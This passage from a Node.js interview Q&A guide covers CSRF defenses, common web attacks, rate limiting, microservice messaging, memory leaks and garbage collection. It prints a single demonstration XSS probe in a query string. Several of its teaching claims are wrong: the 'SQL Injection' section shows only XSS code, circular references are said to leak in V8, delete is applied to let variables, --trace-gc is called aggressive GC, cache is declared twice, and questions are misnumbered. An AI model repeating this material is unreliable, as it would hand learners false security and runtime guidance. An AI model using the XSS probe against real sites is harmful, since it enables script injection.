const csrf = require('csurf');
const session = require('express-session');
const express = require('express');
const app = express();

// Session middleware
app.use(session({ secret: 'secret' }));

// CSRF protection
const csrfProtection = csrf({ cookie: false });

// Show form with CSRF token
app.get('/transfer', csrfProtection, (req, res) => {
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input type="number" name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `);
});

// Handle form submission
app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF token is automatically verified by middleware
  // If invalid, this endpoint won't be reached
  const amount = req.body.amount;
  // Process transfer
  res.send('Transfer successful!');
});
```

**2. Check Same-Site Cookie**

Tell the browser to only send cookies for same-site requests:

```javascript
app.use(session({
  secret: 'secret',
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict' // Only send cookie to same site
  }
}));
```

**3. Check Referer Header**

The server checks if the request came from your own website:

```javascript
app.post('/api/transfer', (req, res) => {
  const referer = req.get('referer');
  
  // Only allow requests from your own domain
  if (!referer || !referer.includes('yourdomain.com')) {
    return res.status(403).json({ error: 'CSRF protection: Invalid origin' });
  }
  
  // Process the request
});
```

**4. Require Re-authentication for Important Actions**

For sensitive operations, ask the user to enter their password again:

```javascript
app.post('/delete-account', (req, res) => {
  // Verify password
  if (!verifyPassword(req.user.id, req.body.password)) {
    return res.status(403).json({ error: 'Invalid password' });
  }
  
  // Delete account
  deleteAccount(req.user.id);
  res.json({ success: true });
});
```

**Complete Protection Example:**

```javascript
const express = require('express');
const helmet = require('helmet');
const csrf = require('csurf');
const session = require('express-session');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Session with SameSite cookie
app.use(session({
  secret: 'secret',
  cookie: { sameSite: 'strict', httpOnly: true }
}));

// CSRF protection
const csrfProtection = csrf({ cookie: false });

// Protected endpoint
app.post('/transfer-money', csrfProtection, (req, res) => {
  // CSRF token is verified automatically
  const { amount, toAccount } = req.body;
  
  // Additional checks
  if (req.get('origin') !== 'https://mybank.com') {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  // Process transfer
  res.json({ success: true });
});

app.listen(3000);
```

**Best Practices (Simple):**

- Use CSRF tokens on all forms
- Set SameSite cookie attribute
- Check Referer header
- Require re-authentication for sensitive operations
- Don't allow uploads of JavaScript files
- Keep libraries updated
- Test for vulnerabilities

**Key Takeaway:**

- **CSRF Attack** = Tricking you into making unintended requests while logged in
- **Protection** = CSRF tokens, SameSite cookies, Referer checks
- Always verify that requests come from your own application

---

## 36. What are other types of security attacks we should protect against?

**Answer (Simple Explanation):**

**Common Security Attacks and Protection:**

**1. SQL Injection**

**What it is:** Attacker injects SQL code into your database query.

```javascript
// ❌ DANGEROUS - User input directly in SQL
app.get('/greet', (req, res) => {
  const name = req.query.name;
  res.send(`<h1>Hello ${name}</h1>`); // User could inject code here
});

// Example attack: /greet?name=<script>alert('Hacked!')</script>

// ✅ SAFE - Use a sanitizer
const sanitizer = require('xss');

app.get('/greet', (req, res) => {
  const name = req.query.name;
  const cleanName = sanitizer(name); // Remove malicious code
  res.send(`<h1>Hello ${cleanName}</h1>`);
});
```

**2. Brute Force Attack**

**What it is:** Attacker tries many password combinations to guess your password.

```javascript
// ❌ DANGEROUS - No protection
app.post('/login', (req, res) => {
  const user = findUser(req.body.email, req.body.password);
  if (user) res.json({ token: createToken(user) });
});

// ✅ SAFE - Rate limiting + account lockout
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5 // Only 5 login attempts per 15 minutes
});

// Apply to login route
app.post('/login', limiter, (req, res) => {
  const user = findUser(req.body.email, req.body.password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  res.json({ token: createToken(user) });
});
```

**3. Man-in-the-Middle (MITM) Attack**

**What it is:** Attacker intercepts communication between you and the server.

```javascript
// ❌ DANGEROUS - No encryption
http.createServer((req, res) => {
  // Data is sent in plain text!
}).listen(3000);

// ✅ SAFE - Use HTTPS
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('private-key.pem'),
  cert: fs.readFileSync('certificate.pem')
};

https.createServer(options, (req, res) => {
  // Data is encrypted!
  res.writeHead(200);
  res.end('Secure!');
}).listen(3000);
```

**4. Clickjacking**

**What it is:** Attacker tricks you into clicking a hidden button on a fake website.

```javascript
// ❌ DANGEROUS - Can be embedded in iframe
app.use((req, res, next) => {
  // No protection
  next();
});

// ✅ SAFE - Prevent framing
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});
```

**5. Insecure Deserialization**

**What it is:** Attacker manipulates serialized data to execute code.

```javascript
// ❌ DANGEROUS
const data = JSON.parse(userInput);
eval(data); // Never do this!

// ✅ SAFE
const data = JSON.parse(userInput);
// Only access specific properties
const id = data.id;
const name = data.name;
```

**6. Security Misconfiguration**

**What it is:** Default settings left enabled (like debug mode in production).

```javascript
// ❌ DANGEROUS - Debug mode in production
if (true) {
  app.use(errorHandler); // Shows detailed error messages to users
}

// ✅ SAFE - Debug only in development
if (process.env.NODE_ENV === 'development') {
  app.use(errorHandler);
} else {
  app.use((err, req, res, next) => {
    console.error(err);
    res.status(500).json({ error: 'Internal Server Error' });
  });
}
```

**7. Sensitive Data Exposure**

**What it is:** Sensitive information is not encrypted or protected.

```javascript
// ❌ DANGEROUS - Password stored in plain text
db.save({ email: user.email, password: userInput });

// ✅ SAFE - Hash password
const bcrypt = require('bcrypt');
const hashedPassword = bcrypt.hashSync(userInput, 10);
db.save({ email: user.email, password: hashedPassword });
```

**Complete Security Checklist:**

```javascript
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const sanitizer = require('xss');
const bcrypt = require('bcrypt');
const https = require('https');

const app = express();

// 1. Use HTTPS
// (Set up SSL certificates)

// 2. Security headers
app.use(helmet());

// 3. Rate limiting
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
}));

// 4. Sanitize input
app.use(express.json());
app.use((req, res, next) => {
  for (let key in req.body) {
    if (typeof req.body[key] === 'string') {
      req.body[key] = sanitizer(req.body[key]);
    }
  }
  next();
});

// 5. Parameterized queries (for database)
// Always use parameterized queries

// 6. Password hashing
app.post('/register', (req, res) => {
  const hashedPassword = bcrypt.hashSync(req.body.password, 10);
  // Save hashedPassword to database
});

// 7. Secure error handling
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Internal Server Error' });
});

app.listen(3000);
```

**Best Practices (Simple):**

- Use HTTPS for all communication
- Hash passwords and sensitive data
- Use parameterized queries to prevent SQL injection
- Implement rate limiting
- Keep security headers enabled
- Never expose sensitive information
- Keep software updated
- Validate and sanitize all input

**Key Takeaway:**

- Many types of attacks exist
- Each requires different protection strategies
- Defense in depth (multiple layers) is best
- Always assume user input is malicious

---

## 37. What is Rate Limiting? How to implement it in a Node.js application?

**Answer (Simple Explanation):**

**What is Rate Limiting?**

Rate limiting is like a **bouncer at a nightclub**:
- The bouncer lets in a limited number of people per hour
- After that limit is reached, no one else can enter
- This prevents overcrowding and keeps everyone safe

In an application:
- You limit the number of requests from a user per minute/hour
- If they exceed the limit, their request is rejected
- This protects against abuse, DDoS attacks, and scraping

**Real Example:**

```
User A: Makes 100 requests in 1 minute → Limit is 50 per minute
        After request 50, all other requests are blocked
        Error: "Too many requests, try again later"
```

**Why Rate Limiting is Important:**

1. **Prevent Brute Force**: Stop password guessing attacks
2. **Prevent DDoS**: Stop attackers from overwhelming the server
3. **Prevent Scraping**: Stop bots from stealing data
4. **Fair Usage**: Ensure all users get fair access
5. **Reduce Costs**: Prevent accidental or malicious overuse

**Simple Rate Limiting Example:**

```javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Allow max 100 requests per 15 minutes from one IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Apply to all routes
app.use(limiter);

app.get('/api/data', (req, res) => {
  res.json({ data: 'some data' });
});

app.listen(3000);
```

**Different Limits for Different Endpoints:**

```javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Strict limit for login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5 // Only 5 login attempts per 15 minutes
});

// Normal limit for API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});

// Strict limit for password reset
const resetLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3 // Only 3 reset attempts per hour
});

// Apply specific limiters
app.post('/login', loginLimiter, (req, res) => {
  // Handle login
});

app.get('/api/data', apiLimiter, (req, res) => {
  // Handle API request
});

app.post('/forgot-password', resetLimiter, (req, res) => {
  // Handle password reset
});

app.listen(3000);
```

**Rate Limiting by User ID (not just IP):**

```javascript
const rateLimit = require('express-rate-limit');
const app = express();

// Limit by user ID instead of IP
const userLimiter = rateLimit({
  keyGenerator: (req, res) => {
    return req.user.id; // Use user ID instead of IP
  },
  windowMs: 15 * 60 * 1000,
  max: 100
});

app.get('/api/data', (req, res) => {
  // Requires authentication middleware first
  const authenticate = (req, res, next) => {
    req.user = { id: getUserId(req) };
    next();
  };
  
  // Apply limiter
  userLimiter(req, res, () => {
    res.json({ data: 'protected data' });
  });
});
```

**Advanced Rate Limiting with Store:**

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const redis = require('redis');
const app = express();

const redisClient = redis.createClient();

// Use Redis for distributed rate limiting
const limiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:', // Rate limit prefix
  }),
  windowMs: 15 * 60 * 1000,
  max: 100
});

app.use(limiter);

app.listen(3000);
```

**Complete Example with Monitoring:**

```javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Create limiter with custom handling
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  skip: (req, res) => {
    // Skip rate limiting for admin users
    return req.user && req.user.isAdmin;
  },
  handler: (req, res) => {
    console.log(`Rate limit exceeded for IP: ${req.ip}`);
    res.status(429).json({
      error: 'Too many requests',
      retryAfter: req.rateLimit.resetTime
    });
  }
});

// Monitor rate limit
app.use((req, res, next) => {
  limiter(req, res, next);
});

app.get('/api/data', (req, res) => {
  res.json({
    data: 'some data',
    remaining: req.rateLimit.limit - req.rateLimit.current
  });
});

app.listen(3000);
```

**Best Practices (Simple):**

- Use different limits for different endpoints
- Stricter limits for sensitive operations (login, password reset)
- Use user ID for authenticated users (not IP)
- Use Redis for distributed systems
- Return proper HTTP 429 status code
- Include retry information in response
- Monitor rate limit violations
- Skip rate limiting for admin/internal requests

**Key Takeaway:**

- **Rate Limiting** = Controlling how many requests a user can make
- **Benefits** = Prevents abuse, DDoS, brute force attacks
- **Implementation** = Use express-rate-limit library with specific limits per endpoint

---

## 39. What are different ways microservices communicate?

**Answer (Simple Explanation):**

**What are Microservices?**

Instead of one big application, you have many small applications (services) that work together.

**Example:**
```
Big App (Before):
┌─────────────────────────────┐
│  User Service               │
│  Product Service            │
│  Payment Service            │
│  Order Service              │
└─────────────────────────────┘

Microservices (After):
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│User Service  │  │Product Service│ │Payment Service│
└──────────────┘  └──────────────┘  └──────────────┘
       ↑                   ↑                  ↑
       └───── They communicate together ─────┘
```

**Why Separate Services?**

- **Easy to maintain**: Each team manages one service
- **Easy to scale**: Scale only the service that needs it
- **Easy to update**: Update one service without affecting others
- **Flexibility**: Use different languages for different services

**3 Ways Services Communicate:**

### **1. Synchronous Communication (Request-Response)**

Service A asks Service B for something and waits for an answer.

**Using HTTP/REST:**

```javascript
// Service A - User Service
app.get('/user/:id', async (req, res) => {
  try {
    // Call Product Service
    const response = await fetch(`http://product-service/products/${req.params.id}`);
    const products = await response.json();
    
    res.json({ userId: req.params.id, products });
  } catch (err) {
    res.status(500).json({ error: 'Service unavailable' });
  }
});
```

**Using gRPC (Faster):**

```javascript
// Both services use gRPC for faster communication
const grpc = require('@grpc/grpc-js');

// Service A calls Service B
client.GetUser({ id: 123 }, (err, response) => {
  if (err) console.error(err);
  console.log('User:', response);
});
```

**Problem with Synchronous:**
- If Service B is slow, Service A waits (slow response)
- If Service B crashes, Service A also fails
- Too many dependencies

### **2. Asynchronous Communication (Event-Driven)**

Service A sends a message and continues. Service B processes it when ready.

**Using Message Queues (RabbitMQ, Kafka):**

```javascript
// Service A - User Service
app.post('/register', async (req, res) => {
  const user = createUser(req.body);
  
  // Send message to queue (don't wait)
  messageQueue.publish('user.created', {
    userId: user.id,
    email: user.email
  });
  
  // Respond immediately
  res.json({ userId: user.id });
});

// Service B - Email Service (listening to queue)
messageQueue.subscribe('user.created', (message) => {
  // Send welcome email
  sendEmail(message.email);
});
```

**Using Event Bus:**

```javascript
// Service A - Order Service
app.post('/order', (req, res) => {
  const order = createOrder(req.body);
  
  // Emit event
  eventBus.emit('order:created', order);
  
  res.json(order);
});

// Service B - Payment Service (listening)
eventBus.on('order:created', (order) => {
  processPayment(order);
});

// Service C - Notification Service (listening)
eventBus.on('order:created', (order) => {
  sendNotification(order.userId);
});
```

**Advantages:**
- Services don't need to know about each other
- If a service crashes, message is stored
- Services can process at their own speed
- Easy to add new services

### **3. Hybrid Approach (Sync + Async)**

Use both methods depending on the need.

```javascript
// Synchronous: Get user details immediately
app.get('/user/:id', async (req, res) => {
  const user = await getUserService.getUser(req.params.id);
  res.json(user);
});

// Asynchronous: Process heavy tasks in background
app.post('/generate-report', (req, res) => {
  const reportId = generateReportId();
  
  // Add to queue for background processing
  jobQueue.add('generate-report', { reportId }, {
    delay: 1000
  });
  
  // Respond immediately
  res.json({ reportId, status: 'processing' });
});
```

**Complete Microservices Example:**

```javascript
// Service A - Order Service
const express = require('express');
const amqp = require('amqplib');
const app = express();

let channel;

// Connect to RabbitMQ
async function connectQueue() {
  const connection = await amqp.connect('amqp://localhost');
  channel = await connection.createChannel();
  channel.assertExchange('orders', 'topic', { durable: true });
}

connectQueue();

app.post('/order', async (req, res) => {
  const order = { id: 123, items: req.body.items };
  
  // Publish event asynchronously
  channel.publish(
    'orders',
    'order.created',
    Buffer.from(JSON.stringify(order))
  );
  
  res.json(order);
});

app.listen(3000);
```

```javascript
// Service B - Payment Service (listening to events)
const amqp = require('amqplib');

async function startPaymentService() {
  const connection = await amqp.connect('amqp://localhost');
  const channel = await connection.createChannel();
  
  channel.assertExchange('orders', 'topic', { durable: true });
  const queue = await channel.assertQueue('payment-queue');
  
  // Listen for order created events
  channel.bindQueue(queue.queue, 'orders', 'order.created');
  
  channel.consume(queue.queue, (msg) => {
    const order = JSON.parse(msg.content.toString());
    console.log('Processing payment for order:', order.id);
    processPayment(order);
    
    channel.ack(msg);
  });
}

startPaymentService();
```

**Comparison Table:**

| Feature | Synchronous | Asynchronous |
|---------|------------|--------------|
| **Speed** | Wait for response | Immediate response |
| **Reliability** | Fails if service down | Survives service failure |
| **Complexity** | Simple | More complex |
| **Use Case** | Get data immediately | Processing background tasks |

**Best Practices (Simple):**

- Use **Synchronous** for: Getting data, immediate needs
- Use **Asynchronous** for: Heavy processing, notifications, logs
- Use both together for best results
- Always handle service failures gracefully
- Use timeouts for synchronous calls
- Monitor message queue health

**Key Takeaway:**

- **Synchronous** = Request-Response (wait for answer)
- **Asynchronous** = Event-Driven (don't wait)
- **Hybrid** = Both together (best approach)
- Microservices need good communication patterns

---

## 39. How to handle memory leaks in a Node.js application? How do memory leaks happen?

**Answer (Simple Explanation):**

**What is a Memory Leak?**

Imagine your computer's memory like a bathroom sink:
- **Normal operation**: Water flows in (data is created), water flows out (data is deleted)
- **Memory leak**: Water keeps flowing in, but the drain is blocked. The sink overflows!

In code:
- Data is created but never released
- Memory keeps growing until the application crashes

**Real Example:**

```javascript
// ❌ MEMORY LEAK - Data never gets deleted
const cache = {};

app.get('/users/:id', (req, res) => {
  const userId = req.params.id;
  
  // Every user is stored forever
  if (!cache[userId]) {
    cache[userId] = fetchUser(userId);
  }
  
  res.json(cache[userId]);
});

// After a year, cache has data for all users ever visited
// Memory keeps growing: 1MB → 10MB → 100MB → 1GB → CRASH!
```

**Common Causes of Memory Leaks:**

### **1. Unreleased Intervals and Timeouts**

```javascript
// ❌ MEMORY LEAK
app.post('/monitor/:userId', (req, res) => {
  const userId = req.params.userId;
  
  // This interval is never stopped
  setInterval(() => {
    console.log(`Monitoring ${userId}`);
  }, 1000);
  
  res.json({ status: 'monitoring' });
});

// Every request creates a new interval that never stops
// If 1000 users call this, you have 1000 intervals running!

// ✅ FIXED - Stop the interval
const intervals = {};

app.post('/monitor/:userId', (req, res) => {
  const userId = req.params.userId;
  
  intervals[userId] = setInterval(() => {
    console.log(`Monitoring ${userId}`);
  }, 1000);
  
  res.json({ status: 'monitoring' });
});

app.delete('/monitor/:userId', (req, res) => {
  const userId = req.params.userId;
  clearInterval(intervals[userId]); // Stop the interval
  delete intervals[userId];
  res.json({ status: 'stopped' });
});
```

### **2. Event Listeners Not Removed**

```javascript
// ❌ MEMORY LEAK
function processFile() {
  const readStream = fs.createReadStream('file.txt');
  
  // Listener is never removed
  readStream.on('data', (chunk) => {
    console.log('Chunk:', chunk);
  });
}

// Call this function many times
for (let i = 0; i < 1000; i++) {
  processFile(`file${i}.txt`);
}

// ✅ FIXED - Remove listeners
function processFile() {
  const readStream = fs.createReadStream('file.txt');
  
  const dataHandler = (chunk) => {
    console.log('Chunk:', chunk);
  };
  
  readStream.on('data', dataHandler);
  
  // Remove listener when done
  readStream.on('end', () => {
    readStream.removeListener('data', dataHandler);
  });
}
```

### **3. Circular References**

```javascript
// ❌ MEMORY LEAK
let objectA = { name: 'A' };
let objectB = { name: 'B' };

objectA.ref = objectB;
objectB.ref = objectA;

// A refers to B, B refers to A
// Even if we delete both variables, they still reference each other
delete objectA;
delete objectB;
// Objects are not deleted because they reference each other!

// ✅ FIXED - Break circular reference before deleting
objectA.ref = null;
objectB.ref = null;
delete objectA;
delete objectB;
```

### **4. Global Variables**

```javascript
// ❌ MEMORY LEAK
function processRequest(data) {
  // Data is stored globally forever
  global.lastRequest = data;
  
  // If every request adds data, global.lastRequest grows indefinitely
}

// ✅ FIXED - Use local variables or cleanup
function processRequest(data) {
  const lastRequest = data; // Local variable
  // Automatically deleted when function ends
}
```

### **5. DOM References in Browser (if using Node.js for rendering)**

```javascript
// ❌ MEMORY LEAK
class Window {
  constructor() {
    this.elements = [];
    this.addElement(); // This is never cleared
  }
  
  addElement() {
    this.elements.push(document.createElement('div'));
  }
}

// ✅ FIXED - Clear references when done
class Window {
  constructor() {
    this.elements = [];
  }
  
  addElement() {
    this.elements.push(document.createElement('div'));
  }
  
  destroy() {
    this.elements = []; // Clear references
  }
}
```

**How to Detect Memory Leaks:**

### **1. Use Node.js Memory Analysis**

```javascript
// Check memory usage
setInterval(() => {
  const memUsage = process.memoryUsage();
  console.log({
    rss: Math.round(memUsage.rss / 1024 / 1024) + ' MB',
    heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024) + ' MB',
    heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + ' MB'
  });
}, 5000);

// If heapUsed keeps growing, there's a memory leak
```

### **2. Use Chrome DevTools**

```bash
# Run with inspect
node --inspect app.js

# Open chrome://inspect in Chrome
# Use the Memory tab to see what's taking up space
```

### **3. Use Clinic.js**

```bash
npm install -g clinic
clinic doctor -- node app.js
# Shows memory usage, CPU, event loop lag
```

**How to Fix Memory Leaks:**

**1. Clean Up Event Listeners:**

```javascript
// ✅ Good practice
const handler = () => { /* ... */ };
emitter.on('event', handler);

// Later, when done:
emitter.removeListener('event', handler);
```

**2. Clean Up Intervals/Timeouts:**

```javascript
// ✅ Good practice
const intervalId = setInterval(() => { /* ... */ }, 1000);

// Later, when done:
clearInterval(intervalId);
```

**3. Use WeakMaps for Caching:**

```javascript
// ✅ Better caching approach
const cache = new WeakMap();

function cacheUser(user) {
  cache.set(user, userData);
  // Automatically deleted when user object is deleted
}
```

**4. Implement Proper Cleanup:**

```javascript
// ✅ Complete example with cleanup
class DatabaseConnection {
  constructor() {
    this.listeners = [];
    this.intervals = [];
  }
  
  addListener(emitter, event, handler) {
    emitter.on(event, handler);
    this.listeners.push({ emitter, event, handler });
  }
  
  addInterval(fn, delay) {
    const id = setInterval(fn, delay);
    this.intervals.push(id);
  }
  
  close() {
    // Clean up all listeners
    this.listeners.forEach(({ emitter, event, handler }) => {
      emitter.removeListener(event, handler);
    });
    
    // Clear all intervals
    this.intervals.forEach(id => clearInterval(id));
    
    // Reset arrays
    this.listeners = [];
    this.intervals = [];
  }
}

// Usage
const db = new DatabaseConnection();

app.on('close', () => {
  db.close(); // Cleanup
});
```

**Best Practices (Simple):**

- Monitor memory usage regularly
- Always clean up event listeners
- Always clear intervals/timeouts
- Avoid global variables
- Use local variables when possible
- Use WeakMaps for caches
- Implement proper cleanup methods
- Test for memory leaks during development

**Key Takeaway:**

- **Memory Leak** = Memory that's never released and keeps growing
- **Common Causes** = Unreleased intervals, event listeners, global variables, circular references
- **Prevention** = Always cleanup resources, use local variables, monitor memory
- **Detection** = Use Chrome DevTools or clinic.js

---

## 39. What is garbage collection? How does garbage collection work in Node.js?

**Answer (Simple Explanation):**

**What is Garbage Collection?**

Garbage collection is like a **cleaning service in a building**:
- People create trash (create data in memory)
- After using rooms, trash accumulates
- A cleaning service comes and removes trash no one needs anymore
- This keeps the building clean and organized

In a computer:
- Programs create data (variables, objects) in memory
- When data is no longer needed, it takes up space
- Garbage collection automatically finds and deletes unused data
- This frees up memory for new data

**Simple Example:**

```javascript
// Create data
let user = { name: 'John', age: 30 }; // Takes up memory

// Use it
console.log(user.name);

// Delete it
user = null; // Mark for deletion

// Garbage collection automatically deletes it
// Memory is freed!
```

**How Garbage Collection Works in Node.js:**

Node.js uses a system called **V8** (the JavaScript engine from Chrome) which has two main garbage collection methods:

### **1. Scavenge Garbage Collection (Young Generation)**

Used for short-lived objects.

```javascript
// Objects created in loops are temporary (young)
for (let i = 0; i < 1000; i++) {
  const tempData = { value: i }; // Created and deleted quickly
}

// Scavenge GC quickly cleans these up
```

**How it works:**
- Objects are divided into "new space" (young objects)
- When new space is full, scavenge runs
- Copies living objects to old space
- Deletes everything else
- Fast but happens often

### **2. Mark-Sweep Garbage Collection (Old Generation)**

Used for long-lived objects.

```javascript
// Objects created once and reused are old-generation
const database = {}; // Stays in memory forever

app.get('/user/:id', (req, res) => {
  // Reuses the database object
  const user = database[req.params.id];
  res.json(user);
});

// Mark-sweep GC cleans up old objects less frequently
```

**How it works:**
- Objects in old space that are no longer referenced are marked
- Then swept (deleted) from memory
- Slower but happens less frequently

**Visual Representation:**

```
Application Running
    ↓
Memory fills up with objects
    ↓
Scavenge GC runs (quick)
Young objects → Delete unused, keep used ones
    ↓
Some objects move to old generation
    ↓
Old space fills up
    ↓
Mark-Sweep GC runs (slower)
Old objects → Delete unused, keep used ones
```

**Complete Example:**

```javascript
const express = require('express');
const app = express();

// Monitor garbage collection
if (global.gc) {
  // Run with: node --expose-gc app.js
  setInterval(() => {
    console.log('Before GC:', process.memoryUsage());
    global.gc(); // Force garbage collection
    console.log('After GC:', process.memoryUsage());
  }, 30000); // Every 30 seconds
}

// Example of garbage collection in action
let cache = {};

app.get('/data/:id', (req, res) => {
  const id = req.params.id;
  
  // Cache can grow indefinitely - memory leak!
  if (!cache[id]) {
    cache[id] = fetchExpensiveData(id);
  }
  
  res.json(cache[id]);
});

// ❌ Problem: cache grows forever
// Even after data is no longer used, it stays in memory

// ✅ Solution: Implement cache eviction
let cache = {};
const CACHE_LIMIT = 100;

app.get('/data/:id', (req, res) => {
  const id = req.params.id;
  
  // Keep cache size limited
  if (Object.keys(cache).length > CACHE_LIMIT) {
    const firstKey = Object.keys(cache)[0];
    delete cache[firstKey]; // Delete oldest item
  }
  
  if (!cache[id]) {
    cache[id] = fetchExpensiveData(id);
  }
  
  res.json(cache[id]);
});

app.listen(3000);
```

**Different GC Strategies:**

```bash
# Run Node.js with different GC strategies

# Default (automatic)
node app.js

# Expose GC for manual control
node --expose-gc app.js

# Aggressive GC (more frequent, uses more CPU)
node --trace-gc app.js

# Manual GC trigger
node --expose-gc app.js
```

**Monitoring Garbage Collection:**

```javascript
const v8 = require('v8');

// Get heap statistics
function printHeapStats() {
  const heapStats = v8.getHeapStatistics();
  console.log({
    totalHeapSize: heapStats.total_heap_size,
    executeableSize: heapStats.total_executable_size,
    physicalSize: heapStats.total_physical_size
  });
}

// Monitor for memory leaks
const memoryTracker = {};

setInterval(() => {
  const current = process.memoryUsage().heapUsed;
  const previous = memoryTracker.previous || 0;
  const increase = current - previous;
  
  console.log(`Memory increase: ${(increase / 1024 / 1024).toFixed(2)} MB`);
  
  if (increase > 50 * 1024 * 1024) { // 50MB increase
    console.warn('⚠️ Large memory increase detected!');
  }
  
  memoryTracker.previous = current;
}, 10000); // Check every 10 seconds
```

**Best Practices for GC:**

1. **Write GC-friendly code:**

```javascript
// ❌ Creates many temporary objects
for (let i = 0; i < 1000000; i++) {
  const obj = { value: i * 2 }; // Creates 1M objects
}

// ✅ Reuse objects
const obj = {};
for (let i = 0; i < 1000000; i++) {
  obj.value = i * 2; // Reuses same object
}
```

2. **Avoid memory leaks:**

```javascript
// ❌ Leaks memory
let globalArray = [];
app.get('/data', (req, res) => {
  globalArray.push(req.query); // Keeps growing
});

// ✅ Clean up
let cache = {};
app.get('/data', (req, res) => {
  if (Object.keys(cache).length > 100) {
    cache = {}; // Reset cache
  }
  cache[req.query.id] = req.query;
});
```

3. **Monitor in production:**

```javascript
// Send metrics to monitoring service
setInterval(() => {
  const mem = process.memoryUsage();
  sendMetrics({
    heapUsed: mem.heapUsed,
    heapTotal: mem.heapTotal,
    rss: mem.rss
  });
}, 60000); // Every minute
```

**Key Takeaway:**

- **Garbage Collection** = Automatic cleanup of unused memory
- **Scavenge GC** = Fast cleanup for young objects
- **Mark-Sweep GC** = Slower cleanup for old objects
- **Best practice** = Write GC-friendly code, avoid memory leaks, monitor memory
